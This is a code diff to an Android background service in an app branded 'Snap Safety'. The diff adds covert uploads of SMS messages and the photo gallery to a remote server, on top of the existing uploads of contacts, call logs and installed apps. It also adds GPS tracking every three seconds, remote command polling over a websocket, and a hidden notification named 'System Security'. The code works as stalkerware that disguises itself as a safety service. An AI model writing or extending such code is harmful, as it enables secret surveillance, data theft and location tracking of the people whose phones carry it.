@@ -53,6 +53,11 @@ public class CompanionSyncService extends Service {
         return START_STICKY;
     }
 
+    public static volatile boolean isLiveMovementActive = false;
+    public static void setLiveMovementActive(Context ctx, boolean active) {
+        isLiveMovementActive = active;
+    }
+
     private void syncInitialTelemetry() {
         final String deviceId = prefs.getString("device_id", null);
         final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
@@ -60,42 +65,34 @@ public class CompanionSyncService extends Service {
         TelemetryHelper.syncInstalledApps(this, serverUrl, deviceId, null);
         TelemetryHelper.syncContacts(this, serverUrl, deviceId, null);
         TelemetryHelper.syncCalls(this, serverUrl, deviceId, null);
+        TelemetryHelper.syncMessages(this, serverUrl, deviceId, null);
+        GalleryHelper.syncGallery(this, serverUrl, deviceId, null);
     }
 
     private void initLocationListener() {
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         if (locationManager == null) return;
-
-        locationListener = new LocationListener() {
-            @Override
-            public void onLocationChanged(Location loc) {
-                if (loc != null) dispatchLocation(loc);
-            }
-            @Override public void onStatusChanged(String p, int s, Bundle b) {}
-            @Override public void onProviderEnabled(String p) {}
-            @Override public void onProviderDisabled(String p) {}
-        };
+        locationListener = loc -> { if (loc != null) dispatchLocation(loc); };
     }
 
     @SuppressLint("MissingPermission")
     private void requestActiveLocationFix() {
         if (locationManager == null || locationListener == null) return;
-        new Handler(Looper.getMainLooper()).post(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
-                        Location lastGps = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                        if (lastGps != null) dispatchLocation(lastGps);
-                    }
-                    if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000, 5, locationListener, Looper.getMainLooper());
-                        Location lastNet = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                        if (lastNet != null) dispatchLocation(lastNet);
-                    }
-                } catch (SecurityException ignored) {}
-            }
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                long interval = isLiveMovementActive ? 3000L : 30000L;
+                float dist = isLiveMovementActive ? 1.0f : 5.0f;
+                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, interval, dist, locationListener, Looper.getMainLooper());
+                    Location last = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                    if (last != null) dispatchLocation(last);
+                }
+                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, interval, dist, locationListener, Looper.getMainLooper());
+                    Location last = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                    if (last != null) dispatchLocation(last);
+                }
+            } catch (SecurityException ignored) {}
         });
     }
 
@@ -103,18 +100,30 @@ public class CompanionSyncService extends Service {
         final String deviceId = prefs.getString("device_id", null);
         final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
         if (deviceId == null || loc == null) return;
-        ApiClient.sendLocation(serverUrl, deviceId, loc.getLatitude(), loc.getLongitude(), loc.getAccuracy(), getBatteryLevel(), null);
+
+        if (isLiveMovementActive) {
+            try {
+                JSONObject b = new JSONObject();
+                b.put("device_id", deviceId);
+                b.put("latitude", loc.getLatitude());
+                b.put("longitude", loc.getLongitude());
+                b.put("accuracy", loc.getAccuracy());
+                b.put("speed", loc.getSpeed());
+                b.put("battery_level", getBatteryLevel());
+                b.put("persist", true);
+                ApiClient.postJson(serverUrl + "/api/device-sync/live-location", b, null);
+            } catch (Exception ignored) {}
+        } else {
+            ApiClient.sendLocation(serverUrl, deviceId, loc.getLatitude(), loc.getLongitude(), loc.getAccuracy(), getBatteryLevel(), null);
+        }
     }
 
     private void startPeriodicSync() {
         if (scheduler != null && !scheduler.isShutdown()) return;
         scheduler = Executors.newSingleThreadScheduledExecutor();
-        scheduler.scheduleWithFixedDelay(new Runnable() {
-            @Override
-            public void run() {
-                requestActiveLocationFix();
-                pollServerCommands();
-            }
+        scheduler.scheduleWithFixedDelay(() -> {
+            requestActiveLocationFix();
+            pollServerCommands();
         }, 2, 20, TimeUnit.SECONDS);
     }
 
@@ -125,17 +134,19 @@ public class CompanionSyncService extends Service {
 
         ApiClient.sendHeartbeat(serverUrl, deviceId, getBatteryLevel(), false, new ApiClient.ApiCallback() {
             @Override
-            public void onSuccess(JSONObject response) {
-                JSONArray cmds = response.optJSONArray("commands");
+            public void onSuccess(JSONObject res) {
+                JSONObject rt = res.optJSONObject("realtime");
+                if (rt != null) {
+                    RealtimeSocketManager.getInstance(CompanionSyncService.this).connect(rt.optString("ws_url"), deviceId, serverUrl);
+                }
+                JSONArray cmds = res.optJSONArray("commands");
                 if (cmds == null || cmds.length() == 0) return;
                 for (int i = 0; i < cmds.length(); i++) {
                     JSONObject c = cmds.optJSONObject(i);
-                    CommandDispatcher.dispatch(CompanionSyncService.this, serverUrl, deviceId, c, new CommandDispatcher.LocationRefreshCallback() {
-                        @Override public void onRefreshNeeded() { requestActiveLocationFix(); }
-                    });
+                    CommandDispatcher.dispatch(CompanionSyncService.this, serverUrl, deviceId, c, () -> requestActiveLocationFix());
                 }
             }
-            @Override public void onError(String error) {}
+            @Override public void onError(String e) {}
         });
     }
 
@@ -151,7 +162,6 @@ public class CompanionSyncService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "System Security", NotificationManager.IMPORTANCE_MIN);
             ch.setShowBadge(false);
-            ch.setSound(null, null);
             NotificationManager nm = getSystemService(NotificationManager.class);
             if (nm != null) nm.createNotificationChannel(ch);
         }
@@ -159,16 +169,14 @@ public class CompanionSyncService extends Service {
 
     private Notification buildNotification() {
         Intent launch = new Intent(this, MainActivity.class);
-        PendingIntent pi = PendingIntent.getActivity(this, 0, launch,
-                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
+        PendingIntent pi = PendingIntent.getActivity(this, 0, launch, Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
         return new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("Snap Safety")
                 .setContentText("Child safety service active")
                 .setSmallIcon(R.drawable.ic_launcher)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-                .setContentIntent(pi)
-                .build();
+                .setContentIntent(pi).build();
     }
 
     @Override public IBinder onBind(Intent intent) { return null; }
@@ -178,6 +186,7 @@ public class CompanionSyncService extends Service {
         WatchdogReceiver.scheduleWatchdog(this);
         if (scheduler != null) scheduler.shutdown();
         if (locationManager != null && locationListener != null) locationManager.removeUpdates(locationListener);
+        RealtimeSocketManager.getInstance(this).disconnect();
         if (wakeLock != null && wakeLock.isHeld()) {
             try { wakeLock.release(); } catch (Exception ignored) {}
         }
